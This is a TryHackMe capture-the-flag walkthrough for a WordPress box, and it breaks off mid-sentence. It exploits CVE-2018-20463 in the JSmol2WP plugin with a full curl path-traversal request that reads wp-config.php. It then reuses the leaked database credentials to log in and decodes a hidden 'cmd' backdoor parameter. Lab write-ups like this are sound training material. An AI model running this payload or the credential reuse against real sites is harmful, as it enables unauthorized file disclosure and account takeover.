A TryHackMe boot-to-root CTF chaining a JSmol2WP file-read vulnerability, a backdoored WordPress plugin, credential reuse, an exposed SSH key, and unrestricted sudo access.

Time to CTF.

Plugin to place JSmol molecular graphics applets in Wordpress posts or pages.

== Description ==
This shortcode plugin places JSmol applets in WordPress posts and pages.

Use [jsmol pdb='accession'] for a minimal version. jsmol2wp will look to see if a pdb file has been uploaded to your wordpress and it will use that file if it can find it. If it can't find a matching post for an uploaded attachement, it will try <a href='http://rcsb.org/pdb'>http://rcsb.org/pdb</a>. If it can't find a match there either, you'll get an error message in the JSmol window. Additional information on optional parameters are at the About/Help link in the applets.

This plugin was developed for use on the website for the Department of Biochemistry and Biophysics
at Texas A&M University (http://biochemistry.tamu.edu).

== Installation ==
Place in the plugins directory and activate. No additional files or configurations are needed.

Let's check SearchSploit:

searchsploit jsmol2wp

No SearchSploit results.

Let's check the plugin directory, too.

curl -I http://www.smol.thm/wp-content/plugins/jsmol2wp/

No SearchSploit hit only means it's not indexed under that name in Exploit-DB.

Let's do a vulnerability lookup for this specific version and plugin.

Aha! Google to the rescue with a vulnerability:

https://nvd.nist.gov/vuln/detail/CVE-2018-20463

We found the vulnerability: CVE-2018-20463, an unauthenticated arbitrary-file-read/path-traversal flaw in JSmol2WP 1.07. The vulnerable endpoint accepts a file path through its query parameter. NVD confirms the vulnerability, and the verified ProjectDiscovery template provides the request structure.

Let's use it to read WordPress’s configuration:

curl -sG \
'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php' \
--data-urlencode 'isform=true' \
--data-urlencode 'call=getRawDataFromDatabase' \
--data-urlencode 'query=php://filter/resource=../../../../wp-config.php' \
-o smol-wp-config.txt

Why four ../ sequences? They walk from the plugin’s php directory back to the WordPress root aka where wp-config.php lives.

Now we take a look:

sed -n '1,220p' smol-wp-config.txt

We got our username and password:

Username: [REDACTED]
Password: [REDACTED]

These are database credentials, so not automatically Windows or Linux creds. DB_HOST=localhost tells us WordPress connects to MySQL locally.

Let's go try the credentials here, and see if they're both database and login credentials:

http://www.smol.thm/wp-login.php

Credential reuse confirmed!

We decoded one layer of camouflage.

The escaped characters are:

\155  → m
\x64  → d

And...

\143  → c
\x6d  → m
\144  → d

Both hidden strings decode to cmd, leaving us with:
